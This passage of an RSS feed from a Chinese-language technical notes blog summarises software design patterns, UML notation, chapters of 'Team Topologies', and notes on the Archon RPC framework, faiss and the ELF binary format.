假设我们希望：对外统一提供一个类 Shape 用于绘制图形； 为了实现不同形状的绘制，我们需要：用于指定形状的类，一定要实现某些函数或满足一定的规则，于是我们定义了一个 DrawAPI 接口，传入不同的类需要实现这个接口； 比如我们可以完成绘制 RedCircle、GreenCircle，则其依赖图如下：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/2.%E7%BB%93%E6%9E%84%E5%9E%8B%E6%A8%A1%E5%BC%8F/8.%E8%BF%87%E6%BB%A4%E5%99%A8%E6%A8%A1%E5%BC%8F/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/2.%E7%BB%93%E6%9E%84%E5%9E%8B%E6%A8%A1%E5%BC%8F/8.%E8%BF%87%E6%BB%A4%E5%99%A8%E6%A8%A1%E5%BC%8F/</guid><description>过滤器模式 # 过滤器模式（Filter Pattern）或标准模式（Criteria Pattern）是一种设计模式，这种模式允许开发人员使用不同的标准来过滤一组对象，通过逻辑运算以解耦的方式把它们连接起来。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/2.%E7%BB%93%E6%9E%84%E5%9E%8B%E6%A8%A1%E5%BC%8F/9.%E7%BB%84%E5%90%88%E6%A8%A1%E5%BC%8F/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/2.%E7%BB%93%E6%9E%84%E5%9E%8B%E6%A8%A1%E5%BC%8F/9.%E7%BB%84%E5%90%88%E6%A8%A1%E5%BC%8F/</guid><description>组合模式 # 组合模式（Composite Pattern），又叫部分整体模式，是用于把一组相似的对象当作一个单一的对象。组合模式依据树形结构来组合对象，用来表示部分以及整体层次。这种类型的设计模式属于结构型模式，它创建了对象组的树形结构。
介绍 # 意图：
将对象组合成树形结构以表示&amp;quot;部分-整体&amp;quot;的层次结构。组合模式使得用户对单个对象和组合对象的使用具有一致性。 当你有以下想法时，你可以使用组合模式： 您想表示对象的部分-整体层次结构（树形结构）。 您希望用户忽略组合对象与单个对象的不同，用户将统一地使用组合结构中的所有对象。 应用实例：
算术表达式包括操作数、操作符和另一个操作数，其中，另一个操作符也可以是操作数、操作符和另一个操作数。 在 JAVA AWT 和 SWING 中，对于 Button 和 Checkbox 是树叶，Container 是树枝。 优点：
高层模块调用简单。 节点自由增加。 缺点：
在使用组合模式时，其叶子和树枝的声明都是实现类，而不是接口，违反了依赖倒置原则。 实现 # 以公司的雇员举例子：
我们首先用一个类 Employee 表示公司中的所有雇员，它的所有属性足以满足需求； 然后为了表示公司雇员之间的层级关系，我们令每一个雇员持有一个下属的列表。 依赖关系如下图所示：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/3.%E8%A1%8C%E4%B8%BA%E5%9E%8B%E6%A8%A1%E5%BC%8F/14.%E8%B4%A3%E4%BB%BB%E9%93%BE%E6%A8%A1%E5%BC%8F/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/3.%E8%A1%8C%E4%B8%BA%E5%9E%8B%E6%A8%A1%E5%BC%8F/14.%E8%B4%A3%E4%BB%BB%E9%93%BE%E6%A8%A1%E5%BC%8F/</guid><description>责任链模式 # 顾名思义，责任链模式（Chain of Responsibility Pattern）为请求创建了一个接收者对象的链。
介绍 # 意图：
避免请求发送者与接收者耦合在一起，让多个对象都有可能接收请求，将这些对象连接成一条链，并且沿着这条链传递请求，直到有对象处理它为止。 优点：
降低耦合度。它将请求的发送者和接收者解耦。 简化了对象。使得对象不需要知道链的结构。 增强给对象指派职责的灵活性。通过改变链内的成员或者调动它们的次序，允许动态地新增或者删除责任。 增加新的请求处理类很方便。 缺点：
不能保证请求一定被接收。 系统性能将受到一定影响，而且在进行代码调试时不太方便，可能会造成循环调用。 可能不容易观察运行时的特征，有碍于除错。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/3.%E8%A1%8C%E4%B8%BA%E5%9E%8B%E6%A8%A1%E5%BC%8F/15.%E5%91%BD%E4%BB%A4%E6%A8%A1%E5%BC%8F/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/3.%E8%A1%8C%E4%B8%BA%E5%9E%8B%E6%A8%A1%E5%BC%8F/15.%E5%91%BD%E4%BB%A4%E6%A8%A1%E5%BC%8F/</guid><description>命令模式 # 命令模式（Command Pattern）是一种数据驱动的设计模式，它属于行为型模式。
请求以命令的形式包裹在对象中，并传给调用对象。调用对象寻找可以处理该命令的合适的对象，并把该命令传给相应的对象，该对象执行命令。
介绍 # 意图：
将一个请求封装成一个对象，从而使您可以用不同的请求对客户进行参数化； 对行为请求者与请求实现者进行解耦合； 优点：
降低了系统耦合度。 新的命令可以很容易添加到系统中去。 缺点：
使用命令模式可能会导致某些系统有过多的具体命令类。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/3.%E8%A1%8C%E4%B8%BA%E5%9E%8B%E6%A8%A1%E5%BC%8F/16.%E8%A7%A3%E9%87%8A%E5%99%A8%E6%A8%A1%E5%BC%8F/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/3.%E8%A1%8C%E4%B8%BA%E5%9E%8B%E6%A8%A1%E5%BC%8F/16.%E8%A7%A3%E9%87%8A%E5%99%A8%E6%A8%A1%E5%BC%8F/</guid><description>解释器模式 # 解释器模式（Interpreter Pattern）提供了评估语言的语法或表达式的方式，它属于行为型模式。
这种模式实现了一个表达式接口，该接口解释一个特定的上下文。这种模式被用在 SQL 解析、符号处理引擎等。
介绍 # 意图：
给定一个语言，定义它的文法表示，并定义一个解释器，这个解释器使用该标识来解释语言中的句子。
对于一些固定文法构建一个解释句子的解释器。
**如何解决：**构建语法树，定义终结符与非终结符。
应用实例：
编译器、运算表达式计算。 一个简单语法需要解释的场景。 优点：
可扩展性比较好，灵活。 增加了新的解释表达式的方式。 易于实现简单文法。 缺点：
可利用场景比较少。 对于复杂的文法比较难维护。 解释器模式会引起类膨胀。 解释器模式采用递归调用方法。 PostScript:
可利用场景比较少，JAVA 中如果碰到可以用 expression4J 代替。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/3.%E8%A1%8C%E4%B8%BA%E5%9E%8B%E6%A8%A1%E5%BC%8F/17.%E8%BF%AD%E4%BB%A3%E5%99%A8%E6%A8%A1%E5%BC%8F/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/3.%E8%A1%8C%E4%B8%BA%E5%9E%8B%E6%A8%A1%E5%BC%8F/17.%E8%BF%AD%E4%BB%A3%E5%99%A8%E6%A8%A1%E5%BC%8F/</guid><description>迭代器模式 # 迭代器模式（Iterator Pattern）是 Java 和 .Net 编程环境中非常常用的设计模式。这种模式用于顺序访问集合对象的元素，不需要知道集合对象的底层表示。
介绍 # 意图：
提供一种方法顺序访问一个聚合对象中各个元素, 而又无须暴露该对象的内部表示。 主要有以下的需求时，可以使用迭代器模式： 访问一个聚合对象的内容而无须暴露它的内部表示。 需要为聚合对象提供多种遍历方式。 为遍历不同的聚合结构提供一个统一的接口。 优点：
它支持以不同的方式遍历一个聚合对象。 迭代器简化了聚合类。 在同一个聚合上可以有多个遍历。 在迭代器模式中，增加新的聚合类和迭代器类都很方便，无须修改原有代码。 缺点：
由于迭代器模式将存储数据和遍历数据的职责分离，增加新的聚合类需要对应增加新的迭代器类，类的个数成对增加，这在一定程度上增加了系统的复杂性。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/3.%E8%A1%8C%E4%B8%BA%E5%9E%8B%E6%A8%A1%E5%BC%8F/18.%E4%B8%AD%E4%BB%8B%E8%80%85%E6%A8%A1%E5%BC%8F/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/3.%E8%A1%8C%E4%B8%BA%E5%9E%8B%E6%A8%A1%E5%BC%8F/18.%E4%B8%AD%E4%BB%8B%E8%80%85%E6%A8%A1%E5%BC%8F/</guid><description>中介者模式 # 中介者模式（Mediator Pattern）是用来降低多个对象和类之间的通信复杂性。
这种模式提供了一个中介类，该类通常处理不同类之间的通信，并支持松耦合，使代码易于维护。
介绍 #</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/reactor%E6%A8%A1%E5%BC%8F/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/reactor%E6%A8%A1%E5%BC%8F/</guid><description>Reactor 模式 # 一个网络连接对应于一个线程处理，是最原始的 Web 应用模型：
但是这种模型对每个连接都创造一个 handler 容易遇到瓶颈，负载增加时性能下降非常快：
accept 方法会阻塞等待 client 连接，直到 client 连接成功； read 方法从 socket inputstream 读取数据，会阻塞线程直到完成数据读取； write 方法会写入输入到 socket outstream，会阻塞线程直到数据写完； 上面列举的三种方法的特点是：都是引起 IO 的阻塞方法，这种原始的应用模式会导致大量线程空转。使用一个中心的 Reactor 来处理所有会引起阻塞的方法，就是 Reactor 模式：
而上面这种设计模式，Reactor 运行在单线程中，容易成为高并发计算机系统的性能瓶颈。
于是我们可以用一个线程池处理已经连接的所有客户端：
在多 CPU 的机器上 Reactor 又可以拆分成 mainReactor 和 subReactor：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/uml/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/uml/</guid><description>示例 # classDiagram 继承 &amp;lt;|-- Inheritance 组成 *-- Composition 聚合 o-- Aggregation 关联 &amp;lt;-- Association 链接 -- Link Solid 依赖 &amp;lt;.. Dependency 实现 &amp;lt;|.. Realization</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E9%AB%98%E6%95%88%E8%83%BD%E5%9B%A2%E9%98%9F%E6%A8%A1%E5%BC%8F/1.%E7%BB%84%E7%BB%87%E7%BB%93%E6%9E%84%E7%9A%84%E9%99%B7%E9%98%B1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E9%AB%98%E6%95%88%E8%83%BD%E5%9B%A2%E9%98%9F%E6%A8%A1%E5%BC%8F/1.%E7%BB%84%E7%BB%87%E7%BB%93%E6%9E%84%E7%9A%84%E9%99%B7%E9%98%B1/</guid><description>第一章 组织结构的陷阱 # 核心观点 # 作为管理接口的技术人员，我们必须改变之前的思想。
不再将团队视作为一组可替换的个体，它们只要沿用“正确”的流程和使用“正确”的工具就能获得成功；
而是将人员和技术视作为社会技术生态系统中的一份子，正如计算芯片中的碳和硅一样；
组织结构和实际的工作方式之间存在出入：
人们为了完成工作，通常会与另一条汇报线上的人员进行横向或纵向沟通； 组织应该有意识地培养这种创造力和解决问题的能力，并从中受益，而不仅仅局限于自顶向下和自底向上的沟通和汇报； 每个组织都存在三种组织结构（知识型组织成功的关键在于后两者）：
官方架构（组织结构图），促进合规性； 非正式架构，个体间的“影响范围”； 价值创造架构，工作是如何在个人间和团队间完成的； Naomi Stanford 总结的五条组织设计法则：
根据令人信服的理由来设计； 反馈：为设计决策提供开发选项； 选择正确的设计时机； 容错：寻找事务偏离轨迹的线索； 动态：对未来保持警惕； 团队拓扑是一种全新的团队思维模式：
它提供了四类基本团队类型：流动式团队、平台团队、赋能团队、复杂子系统团队； 以及三种核心的团队交互模式：协作模式、服务模式和促进模式； 康威定律：
Melvin E. Conway: Any organization that designs a system (defined broadly) will produce a design whose structure is a copy of the organization&amp;rsquo;s communication structure. Eric Raymond 给出了一个幽默而形象的例子：如果有四个小组合作开发一个编译器，那么你将得到一款具有四个步骤的编译器； 认知负荷：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E9%AB%98%E6%95%88%E8%83%BD%E5%9B%A2%E9%98%9F%E6%A8%A1%E5%BC%8F/2.%E5%BA%B7%E5%A8%81%E5%AE%9A%E5%BE%8B/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E9%AB%98%E6%95%88%E8%83%BD%E5%9B%A2%E9%98%9F%E6%A8%A1%E5%BC%8F/2.%E5%BA%B7%E5%A8%81%E5%AE%9A%E5%BE%8B/</guid><description>第二章 康威定律为何如此重要 # 康威定律现代版本：
如果系统的架构和组织的架构不一致，那么组织架构将会成为赢家； 逆康威定律：
组织需要通过团队和组织结构的改进来实现预期的软件架构； 经过验证的软件架构良好实践：
松耦合：组建不强依赖于其他组件； 高内聚：组件拥有清晰的指责边界，并且它们的内部元素强相关； 清晰合理的版本兼容性； 清晰合理的跨团队测试； 小心那些流于表面的康威定律，错误地解读康威定律可能会带来风险：
工具：盲目地为整个组织选择单一的工具是不合适的，如果两个团队的职责边界没有交集，那么还坚持使用相同的工具就没有什么价值了。用一句话概括来说就是：独立团队使用独立工具，协作团队使用共享工具； 多组件团队：很多组织草率地按照康威定律建立了大量不同的组件团队来分别构建系统的各个小部分； 通过反复的组织结构调整来建立山头或减少人员；</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E9%AB%98%E6%95%88%E8%83%BD%E5%9B%A2%E9%98%9F%E6%A8%A1%E5%BC%8F/3.%E5%9B%A2%E9%98%9F%E4%BC%98%E5%85%88/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E9%AB%98%E6%95%88%E8%83%BD%E5%9B%A2%E9%98%9F%E6%A8%A1%E5%BC%8F/3.%E5%9B%A2%E9%98%9F%E4%BC%98%E5%85%88/</guid><description>第三章 团队优先的思维方式 # 概述 # 现代复杂系统需要高效能团队，对于需要大量信息的知识密集型、问题解决型任务，一个有凝聚力的团队的表现要远远超出个人的集合；
依赖个体来理解和有效处理构建和演进现代软件所需要的信息量和信息的本质是不可持续的，团队活力远比谁在团队中更重要；
建设小而美的长期团队 # 团队规模：
本书中的团队定义：一个由 5-9 人组成的稳定小组，作为一个整体朝着共同的目标努力。我们不应该把工作指派给个人，而是指派给团队。 一个有效的团队最多由 7-9 人组成。 7-9 这一人数限制有着明确的理论基础：
Amazon 提出的 “两张披萨” 理论，即团队规模应该是两张披萨能够喂饱全体成员； 这一人数限制是 Scrum 框架推荐的，它源于对群体认知和信任的进化限制； 邓巴数字：15 是一个人可以信任的人数极限，其中只有 5 个人能够获得深入的了解和信任； 小规模团队带来信任。
工作流向长期团队：
团队需要时间磨合来实现高效，通常团队需要花 2 周到 3 个月甚至更长的时间来形成一个有凝聚力的集体； 提升团队存活周期的最佳办法就是提升团队稳定性。团队应该保持稳定，而非一成不变，仅在必要的时候进行偶尔的调整。 让团队对软件负责：
让一个团队负责系统或子系统； 需要明确的是：团队代码所有权划分并不是在划分地盘，团队对代码负责并维护，而不应该觉得代码是它们的而因此排斥其他人； 团队成员也需要具备团队优先的思维：
团队应该是交付的基础，而非个人； 即便通过引导，有的人依然不适合团队的工作，或者不愿意将团队的需求放在个人需求之上。这些人会影响团队工作，在极端场合下，甚至会摧毁团队； 在团队中拥抱多样性：
一点异质性会极大的帮助创建一个团队的团队； 奖励团队而非奖励个人。
良好设计的边界可以最小化认知负荷 # 约束团队职责以匹配团队认知负荷：
使用团队优先方法，团队的职责与团队所能处理的认知负荷是吻合的。 Sweller 定义了三种不同的认知负荷：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E9%AB%98%E6%95%88%E8%83%BD%E5%9B%A2%E9%98%9F%E6%A8%A1%E5%BC%8F/4.%E9%9D%99%E6%80%81%E5%9B%A2%E9%98%9F%E6%8B%93%E6%89%91/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E9%AB%98%E6%95%88%E8%83%BD%E5%9B%A2%E9%98%9F%E6%A8%A1%E5%BC%8F/4.%E9%9D%99%E6%80%81%E5%9B%A2%E9%98%9F%E6%8B%93%E6%89%91/</guid><description>静态团队拓扑 # 反模式 # 两种特别有代表性的反模式：
“临时起意”的团队设计：需要考虑交流成本； “频繁调动”团队成员：团队仅仅为了项目而组建，但是在项目完成之后就立即被打散。看起来这样体现了高度的灵活性，以及更快速地应对交付日期的响应能力，但是反复切换上下文的成本被低估； DevOps 拓扑反映了两个核心理念：
没有一种通用的组织架构方法来让 DevOps 获得成功； 部分拓扑是阻碍 DevOps 成功的反模式，它们忽略了甚至同 DevOps 的核心理念背道而驰； 其中第二点也就是说：并不存在所谓“正确”的团队拓扑，但在组织中存在很多“错误”的团队拓扑。
成功的模式 # 特性团队依赖于高度工程能力成熟度和互信：
特性团队往往需要修改多个代码库，这些代码库由不同组件团队管理；多个团队在同一个代码库中叠加地工作，会导致代码缺乏负责人，除非团队间遵循高度协作的规则； 随着业务发展，我们逐渐需要一些人考虑和维护整个系统，确保子系统可以融入整个系统，满足期待的用户体验、性能和可靠性。于是“系统架构师”、“系统负责人”、“集成经理”等角色应运而生。 产品团队需要支持系统：
团队保持自主性的关键在于不被外部依赖所阻碍，也就是说新 feature 不能够因为某些团队掌控范围之外的事情发生而处于停滞状态； 产品团队通常承担了巨大的快速交付压力，如果它们所使用的系统无法提供必要的自主性支持，那么就会导致日益增长的摩擦； 云团队无需创建应用基础设施：
“云团队”并不是换了一个名字的“基础设施团队”，他需要提供云服务带来的速度和扩展性； SRE (Site Reliability Engineering) 让扩展性成为可能性：
SRE 是 Google 创建的一种软件运维与改进方法，这个团队更加关注“错误预算（Error Budget）”和“服务等级目标（Service-Level Objectives, SLOs）” 它们有能力将低质量的软件回退给软件开发团队，团队成员需要优秀的软件编程能力； 选择团队拓扑需要考虑的因素 # 技术和文化成熟度。
组织大小、软件规模和工程能力成熟度：
组织大、能力成熟的团队：端对端和专职团队聚焦可用性； 组织大、能力不成熟的团队：端到端团队的常规协作； 组织小、能力成熟的团队：依赖于 PaaS 的专职团队； 组织小、能力不成熟的团队：专职团队间紧密合作； 拆分职能竖井：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E9%AB%98%E6%95%88%E8%83%BD%E5%9B%A2%E9%98%9F%E6%A8%A1%E5%BC%8F/5.%E5%9B%9B%E7%B1%BB%E5%9F%BA%E6%9C%AC%E5%9B%A2%E9%98%9F%E6%8B%93%E6%89%91/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E9%AB%98%E6%95%88%E8%83%BD%E5%9B%A2%E9%98%9F%E6%A8%A1%E5%BC%8F/5.%E5%9B%9B%E7%B1%BB%E5%9F%BA%E6%9C%AC%E5%9B%A2%E9%98%9F%E6%8B%93%E6%89%91/</guid><description>四类基本团队拓扑 # 本书的核心是定义了四类基本团队拓扑：
流动式团队、赋能团队、复杂子系统团队、平台团队； 流动式团队 # 什么是“流动式团队”？
它对应一条单一、有价值的工作流，这也许是一个产品、一项服务、一组功能特性、一个用户故事或者一组用户画像。 流动式团队是组织中最主要的团队类型，其他基本团队拓扑的目标都是为了减轻流动式团队的负担。 与“流动式团队”相反的是按照“项目”组织开发工作。 “流动式团队”的必要能力，包括但不限于
应用的安全性、商业和技术的可行性分析、设计和架构、开发和编码、基础设施和可运维性、度量和监控、产品管理、测试和质量保证、用户体验； 为什么要叫做”流动式团队“而不是”产品团队”或“特性团队“：
“流动”一词有着更广泛的含义，它有助于强化组织对流动性的关注，从而确保流动的顺畅； 并非所有的软件都有产品或者特性这样的概念，但是总是可以从流动性的角度出发； 流动性团队的预期的行为：P94。
赋能团队 # 什么是“赋能团队”？
赋能团队由特定技术领域或产品领域的专家组成，它们给流动式团队提供“调研、学习、实践”新技术的能力。团队进行调研工作，尝试不同的方案，并在工具、实践、框架、技术栈等方面给出高质量的建议。 赋能团队应该尽可能避免自己成为知识的“象牙塔”： 不应该干涉其他团队的技术选择，而是要帮助团队理解并遵循组织级的技术约束； 应该提高流动式团队的自主性，而不是推广自己手动已经有的解决方案； “赋能团队”的预期行为：
赋能团队要主动了解流动式团队的需求，在深入协作时建立定期检查点和联合沟通机制； 赋能团队要保持它们的专业能力保持在浪潮之巅（在过去，这常常被视为架构师或者创新团队的使命）； 它们既要传播好消息，也要传播坏消息； 当流动式团队难以直接使用某些服务时，赋能团队应该充当内外部的服务代理； 不仅要促进自身团队内的学习，也要在流动式团队之间扮演组织内促进共享必要知识的角色。 与实践社区（Communities of Practice, CoP）:
共同点：它们都能提高团队的认知和能力； 区别：赋能团队每天的工作就是赋能，而实践社区则是一个相对松散的组织，每周甚至每个月才会搞一次活动； 复杂子系统团队 # 复杂子系统团队负责构建和维护系统中严重依赖专业领域知识的子系统。它们的设立目标是降低包含或使用复杂子系统的系统中各个流动式团队的认知负荷。
与传统“组件团队”的关键区别：
当某个子系统依赖于大量特定领域知识时才会建立“负责子系统团队”； 团队成立完全是基于认知负荷驱动的，而非出于组件共享的目的； “复杂子系统团队”的预期行为：
根据当前的开发阶段来安排响应的工作：在早期紧密合作，后期关注接口； 应该显著提高流动式团队的交付速度和质量； 需要根据需求优先级合理安排并完成交付。 平台团队 # 平台团队的目标是使流动式团队能够以高度自治的方式交付工作。平台团队提供的内部服务使得流动式团队无须开发底层服务，从而降低认知负荷。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E9%A1%B9%E7%9B%AE%E5%BA%95%E5%B1%82%E5%AE%9E%E7%8E%B0/archon/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E9%A1%B9%E7%9B%AE%E5%BA%95%E5%B1%82%E5%AE%9E%E7%8E%B0/archon/</guid><description>RPC 框架 Archon 学习 # 线程模型 # 四个独立线程池：
Accept 线程池：接受网络请求、accept 方法的线程； IO 线程池：每个线程对应一个 folly::Eventbase，所有与IO相关的操作都在IO线程中以非阻塞的方式执行； worker 线程池：执行 CPU 任务，计算密集任务的线程；除此之外，fbthrift 还会额外为其他四种优先级分别建立两个线程； Async Dispatcher 线程池：Archon 为异步 Client 创建的线程类型，本质上是 IO 线程的一种； 设计概念 IOBuf：
背景：在数据生产消费的时候，通常不是连续的过程，但是在内存使用过程中我们却通常需要申请一块连续的内存； 性能：fbthrift 宣称这一概念带来了很大收益，减少了内存拷贝（Zero Copy），传递指针进行解析，对非连续内存友好（流式序列化和反序列化）； 常见问题与优化思路 # Client Fast Retry 策略与 Server Loadingshedding 策略。
优化思路：少用“异步”、“Buffered”客户端：
Buffered 与 Framed 协议：两者都是 Thrift 的传输协议。Framed 协议有一个四字节的长度指示消息长度；Buffered 协议则通过不断尝试 fid 来探测包传输的边界，探索结束后交给 worker 线程进行序列化；
问题：在请求大包时，Buffered 协议会反复进行序列化探测，CPU 浪费严重；
解决方案：使用“同步 Buffered”的异步接口；</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E9%A1%B9%E7%9B%AE%E5%BA%95%E5%B1%82%E5%AE%9E%E7%8E%B0/faiss/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E9%A1%B9%E7%9B%AE%E5%BA%95%E5%B1%82%E5%AE%9E%E7%8E%B0/faiss/</guid><description>faiss # 1. 项目目的、框架、文件结构、接口 # 简介：
faiss 全称 Facebook AI Similarity Search； 它用于对海量高维数据，在很短的时间内进行邻近点的计算； 它的 Github 开源地址：https://github.com/facebookresearch/faiss，Docker 地址：https://hub.docker.com/r/plippe/faiss-docker/#! 基础知识和框架：
开发语言：C++，开放 API 语言：C++ 或 Python； C++ 中均匀分布：std::uniform_real_distribution； kmeans：一种聚类方法，将 n 组同维度的向量聚类为 k 类； omp：Open Muti-Process，可扩展、跨平台的多线程框架，官网使用例子：https://www.openmp.org/wp-content/uploads/openmp-examples-5.1.pdf。omp 提供编译层面的指令式 API： pragma 可以指定对应指令：#pragma omp directive-specification； C++ 可以用 attribute 的方式指定：[[omp :: directive( directive-specification )]] 编译框架：CMake 单元测试框架：gtest 接口：demo 和 tutorial 中调用的都是 faiss 中以 Index 开头的文件（比如 IndexFlat.h），它们都继承于 Index 这个定义于 Index.h 这个文件的类。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E9%A1%B9%E7%9B%AE%E5%BA%95%E5%B1%82%E5%AE%9E%E7%8E%B0/linux%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/elfformat/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E9%A1%B9%E7%9B%AE%E5%BA%95%E5%B1%82%E5%AE%9E%E7%8E%B0/linux%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/elfformat/</guid><description>参考：
https://linux-audit.com/elf-binaries-on-linux-understanding-and-analysis/ ELF Format # ELF is the abbreviation for Executable and Linkable Format and defines the structure for binaries, libraries, and core files.
The formal specification allows the operating system to interpreter its underlying machine instructions correctly. ELF files are typically the output of a compiler or linker and are a binary format. With the right tools, such file can be analyzed and better understood.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E9%A1%B9%E7%9B%AE%E5%BA%95%E5%B1%82%E5%AE%9E%E7%8E%B0/linux%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/elfsections/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E9%A1%B9%E7%9B%AE%E5%BA%95%E5%B1%82%E5%AE%9E%E7%8E%B0/linux%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/elfsections/</guid><description>参考：
https://linux-audit.com/elf-binaries-on-linux-understanding-and-analysis/
https://lief.quarkslab.com/doc/stable/tutorials/05_elf_infect_plt_got.html
